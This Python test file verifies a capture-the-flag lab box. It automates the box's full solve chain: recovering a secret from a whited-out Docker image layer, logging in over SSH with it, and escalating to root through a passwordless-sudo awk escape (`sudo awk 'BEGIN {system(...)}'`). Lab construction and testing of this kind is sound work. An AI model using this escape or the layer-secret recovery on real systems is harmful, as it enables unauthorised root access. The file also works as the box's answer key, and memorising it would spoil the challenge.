"""Phase 17 verification: cloudbreak-veteran-layers -- the Veteran tier
of "Cloudbreak Pipeline". Headline technique: Docker image LAYER
ARCHAEOLOGY. entrypoint.sh synthesizes a build-artifact tarball
containing several numbered layer directories that genuinely mimic
Docker's own real OverlayFS layer-diff convention -- a file a layer
adds just sits there as a plain file in that layer's own directory, and
a file a LATER layer "deletes" is a zero-length ".wh.<name>" whiteout
marker (the real "AUFS whiteout" convention the OCI image spec
documents and `docker save` itself produces -- not an invented stand-
in). A secret added in an early layer (layer-01) is still sitting there
even though a later layer (layer-03) whites it out -- a naive linear
extraction of the merged final state would never show it, but the
tarball's individual layer directories are each still untouched.

A real `docker save`/`docker load` round-trip (or a nested Docker
daemon) is deliberately NOT used here -- too heavy for a single box --
in favor of hand-synthesizing a tarball with the same real on-disk
layer-diff conventions, the same "small, honest simplification"
philosophy as this project's other hand-rolled stand-ins for real
infrastructure (e.g. cloudbreak-noob-bucket's S3 mock).

Plain single-host box, no backend-specific dependency, works on both
Docker and Kubernetes. 10 real flags, climbing difficulty: web recon
(flags 1-2) -> downloading and opening the layer tarball, confirming
the latest/top layer first (flag 3) -> a middle layer's build-config
hint pointing at the secret's original path (flag 4) -> the headline
layer-archaeology recovery of a secret an early layer added and a later
layer whited out (flag 5, which doubles as the SSH password) -> SSH
foothold (flags 6-7) -> a sudo/GTFOBins ('awk') privesc hint and escape
(flag 8) -> full root shell via the same escape (flags 9-10).

Real HTTP, a real tar inspection, a real SSH session, a real privilege
escalation -- no mocks. Requires the box image already built
(ctf-boxes/cloudbreak-veteran-layers:latest), `sshpass` on PATH, and a
running orchestrator reachable at ORCHESTRATOR_TEST_URL.
"""
import hashlib
import hmac
import io
import os
import secrets as pysecrets
import subprocess
import tarfile

import pytest
import requests

BASE_URL = os.environ.get("ORCHESTRATOR_TEST_URL", "http://127.0.0.1:9100")
BOX_ID = "cloudbreak-veteran-layers"
_TEAM_ID_BASE = pysecrets.randbelow(1_000_000)


def expected_flag(secret: str, n: int) -> str:
    digest = hmac.new(secret.encode(), f"{BOX_ID}:{n}".encode(), hashlib.sha256).hexdigest()
    return f"HLC{{{digest[:10]}}}"


def _port(inst: dict, container_port: int) -> int:
    for p in inst["ports"]:
        if p["container_port"] == container_port:
            return p["host_port"]
    raise AssertionError(f"no port {container_port} in instance ports: {inst['ports']}")


def _ssh(host: str, port: int, password: str, command: str, timeout: float = 20.0):
    return subprocess.run(
        [
            "sshpass", "-p", password, "ssh",
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10",
            "-p", str(port), f"ci-bot@{host}", command,
        ],
        capture_output=True, text=True, timeout=timeout,
    )


def _escalate_via_awk(host: str, port: int, password: str, shell_command: str) -> str:
    """The box's one intended privesc: ci-bot has passwordless sudo on
    /usr/bin/awk -- the classic GTFOBins escape. A BEGIN-only awk
    program never reads stdin (POSIX: if the program consists solely of
    BEGIN actions, awk doesn't read input at all), so `sudo awk 'BEGIN
    {system("...")}'` runs the given shell command as root and exits
    immediately -- no interactive shell/marker trick needed, unlike
    e.g. the nmap NSE escape used elsewhere in this project."""
    remote_cmd = f"sudo awk 'BEGIN {{system(\"{shell_command}\")}}'"
    result = _ssh(host, port, password, remote_cmd)
    assert result.returncode == 0, (
        f"GTFOBins awk escalation failed: rc={result.returncode} stdout={result.stdout!r} stderr={result.stderr!r}"
    )
    return result.stdout


@pytest.fixture(params=["docker", "kubernetes"])
def box_instance(request):
    backend = request.param
    team_id = _TEAM_ID_BASE + (1 if backend == "docker" else 2)
    secret = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id, "box_id": BOX_ID, "team_secret": secret, "backend": backend},
    )
    r.raise_for_status()
    inst = r.json()
    try:
        yield inst, secret, backend
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")


def test_full_ten_flag_chain(box_instance):
    inst, secret, backend = box_instance
    host = inst["entry_host"]
    web_port, ssh_port = _port(inst, 5000), _port(inst, 22)
    base = f"http://{host}:{web_port}"

    # Flags 1-2: plain web recon, including the hint toward the
    # build-artifact download link.
    docs = requests.get(f"{base}/docs", timeout=10).text
    assert expected_flag(secret, 1) in docs
    changelog = requests.get(f"{base}/changelog", timeout=10).text
    assert expected_flag(secret, 2) in changelog
    assert "/artifacts/nimbus-build-artifact.tar" in changelog  # the download hint

    # Download the real layer tarball and open it -- never a direct
    # filesystem shortcut, the same way a real player would have to.
    resp = requests.get(f"{base}/artifacts/nimbus-build-artifact.tar", timeout=15)
    resp.raise_for_status()
    tar = tarfile.open(fileobj=io.BytesIO(resp.content), mode="r:")
    names = tar.getnames()
    assert "layer-00/etc/nimbus/README.txt" in names
    assert "layer-01/etc/nimbus/deploy-secrets.env" in names
    assert "layer-02/etc/nimbus/build.conf" in names
    assert "layer-03/etc/nimbus/.wh.deploy-secrets.env" in names  # the real OCI whiteout marker
    assert "layer-04/var/nimbus/build-info.txt" in names

    def _read(member: str) -> str:
        f = tar.extractfile(member)
        assert f is not None
        return f.read().decode()

    # Flag 3: the latest/top layer -- easy recon, confirms the tar is
    # being opened and read correctly before the real puzzle underneath.
    build_info = _read("layer-04/var/nimbus/build-info.txt")
    assert expected_flag(secret, 3) in build_info

    # Flag 4: a middle layer's build config, hinting at the exact path
    # that gets whited out in a later layer.
    build_conf = _read("layer-02/etc/nimbus/build.conf")
    assert expected_flag(secret, 4) in build_conf
    assert "/etc/nimbus/deploy-secrets.env" in build_conf

    # The whiteout marker is zero-length -- confirms it's a real
    # Docker/OCI-style deletion marker, not the file itself.
    whiteout_member = tar.getmember("layer-03/etc/nimbus/.wh.deploy-secrets.env")
    assert whiteout_member.size == 0

    # Flag 5: the headline layer-archaeology recovery -- the secret
    # itself, still sitting in the EARLY layer that added it, despite
    # being whited out two layers later. This value doubles as the SSH
    # password for ci-bot.
    deploy_secrets = _read("layer-01/etc/nimbus/deploy-secrets.env")
    assert expected_flag(secret, 5) in deploy_secrets
    assert f"DEPLOY_API_KEY={expected_flag(secret, 5)}" in deploy_secrets
    ssh_password = expected_flag(secret, 5)

    # Flag 6: a post-SSH-login confirmation file -- unreachable without
    # a successful authenticated SSH session using the recovered secret.
    welcome = _ssh(host, ssh_port, ssh_password, "cat /etc/nimbus-ci-welcome.txt")
    assert welcome.returncode == 0, welcome.stderr
    assert expected_flag(secret, 6) in welcome.stdout

    # Flag 7: SSH foothold's user.txt.
    user_txt = _ssh(host, ssh_port, ssh_password, "cat user.txt")
    assert user_txt.returncode == 0, user_txt.stderr
    assert expected_flag(secret, 7) in user_txt.stdout

    # A hint file and sudo -l both pointing at the awk GTFOBins privesc.
    notes = _ssh(host, ssh_port, ssh_password, "cat notes.txt")
    assert "awk" in notes.stdout
    sudo_l = _ssh(host, ssh_port, ssh_password, "sudo -l")
    assert "/usr/bin/awk" in sudo_l.stdout

    # Flag 8: a root-only file, read via the GTFOBins escape before
    # going for a full shell.
    audit_log = _escalate_via_awk(host, ssh_port, ssh_password, "cat /var/log/ci-pipeline-audit.log")
    assert expected_flag(secret, 8) in audit_log

    # Flags 9-10: full root shell via the same escape.
    root_output = _escalate_via_awk(host, ssh_port, ssh_password, "cat /root/decommission_notes.txt /root/root.txt")
    assert expected_flag(secret, 9) in root_output
    assert expected_flag(secret, 10) in root_output

    # And confirm it's genuinely a full root shell, not just file reads.
    whoami = _escalate_via_awk(host, ssh_port, ssh_password, "id -u")
    assert whoami.strip() == "0"


def test_idempotent_create(box_instance):
    inst, secret, backend = box_instance
    r = requests.post(
        f"{BASE_URL}/instances",
        json={
            "team_id": inst["team_id"], "box_id": BOX_ID, "team_secret": "a-different-secret-must-be-ignored",
            "backend": backend,
        },
    )
    r.raise_for_status()
    assert r.json()["instance_id"] == inst["instance_id"]


def test_cross_team_flag_isolation(box_instance):
    inst, secret, backend = box_instance
    team_id_b = inst["team_id"] + 1000
    secret_b = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id_b, "box_id": BOX_ID, "team_secret": secret_b, "backend": backend},
    )
    r.raise_for_status()
    inst_b = r.json()
    try:
        host_a, port_a = inst["entry_host"], _port(inst, 5000)
        host_b, port_b = inst_b["entry_host"], _port(inst_b, 5000)
        docs_a = requests.get(f"http://{host_a}:{port_a}/docs", timeout=10).text
        docs_b = requests.get(f"http://{host_b}:{port_b}/docs", timeout=10).text
        assert expected_flag(secret, 1) in docs_a
        assert expected_flag(secret_b, 1) in docs_b
        assert expected_flag(secret, 1) != expected_flag(secret_b, 1)
        assert expected_flag(secret, 1) not in docs_b
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst_b['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")
